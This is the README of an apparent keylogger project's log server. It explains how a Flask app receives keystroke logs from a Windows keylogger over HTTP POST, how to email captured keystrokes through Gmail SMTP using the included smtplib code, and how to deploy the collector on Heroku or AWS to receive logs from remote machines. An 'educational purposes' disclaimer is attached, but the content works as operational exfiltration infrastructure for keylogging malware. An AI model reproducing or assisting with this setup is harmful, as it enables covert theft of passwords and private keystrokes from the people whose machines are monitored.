# Keylogger Log Server

## Overview
This Flask-based log server receives and stores logs from the Windows-based keylogger (keylogger.c). It supports local operation (e.g., http://127.0.0.1:5000 or http://192.168.1.3:5000), SMTP email transmission, or remote server deployment for receiving logs. The server is designed for educational and ethical auditing purposes in controlled environments with explicit permission.

## Features

Receives keylogger logs via HTTP POST or SMTP email.
Stores logs in a local file (e.g., server_logs.txt) with timestamps.
Lightweight and customizable for local or remote setups.
Supports ethical use in cybersecurity labs.

## Requirements

**OS**: Any OS supporting Python (tested on Windows 11)
**Python**: Version 3.6 or higher
**Dependencies**: Flask (pip install flask), smtplib (standard library for SMTP)
**Network**: Local network access or internet for remote/SMTP setup

## Installation

1. Install Python 3.6+ from python.org.

2. Install Flask:
```bash
pip install flask
```

4. Clone or download the repository:

```
git clone
cd log-server
```




5. Ensure the keylogger is configured to send logs to the server’s URL (e.g., http://127.0.0.1:5000/log) or an email address for SMTP.


## Usage

1. Run the Flask server:
```bash
python log_server.py
```


3. The server starts at http://127.0.0.1:5000 (or a specified IP like 192.168.1.3:5000).

4. Logs are received at the /log endpoint (HTTP POST) or via email (SMTP) and saved to server_logs.txt.

5. Stop the server with Ctrl+C.


## Customization
**Local Server**

1. Default setup runs locally:
```bash
python log_server.py
```


3. Update the keylogger’s URL to match the server’s IP/port (e.g., http://192.168.1.3:5000/log).


**SMTP Email Transmission**

1. Modify log_server.py to send logs via email using smtplib:
```python
import smtplib
from email.mime.text import MIMEText

def send_email(log_data, recipient_email):
    msg = MIMEText(log_data)
    msg['Subject'] = 'Keylogger Log'
    msg['From'] = 'your_email@example.com'
    msg['To'] = recipient_email
    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login('your_email@example.com', 'your_app_password')
        server.send_message(msg)
---
```

2. Generate an app-specific password from your email provider (e.g., Gmail’s 2-Step Verification settings).

3. Configure the keylogger to call send_email with log data and a recipient email, or have the server forward POST requests as emails.


## Remote Server Deployment

1. Deploy to a cloud platform (e.g., Heroku, AWS EC2):

**Heroku:**

1. Create a Heroku app: heroku create your-app-name.

2. Push the code: git push heroku main.

3. Set dynamic port in log_server.py:
```python
import os
port = int(os.environ.get('PORT', 5000))
app.run(host='0.0.0.0', port=port)
---
```

5. Update the keylogger’s URL to the remote server’s address.


## Considerations

Do not store or transmit sensitive data without encryption.

## Challenges Overcome

1. Resolved networking issues for stable HTTP/SMTP log transmission.
2. Configured Flask for reliable POST request handling.
3. Managed log storage to prevent data loss.
4. Overcame SMTP authentication and remote deployment challenges.

License
This project is for educational purposes only and is not licensed for commercial or unethical use.
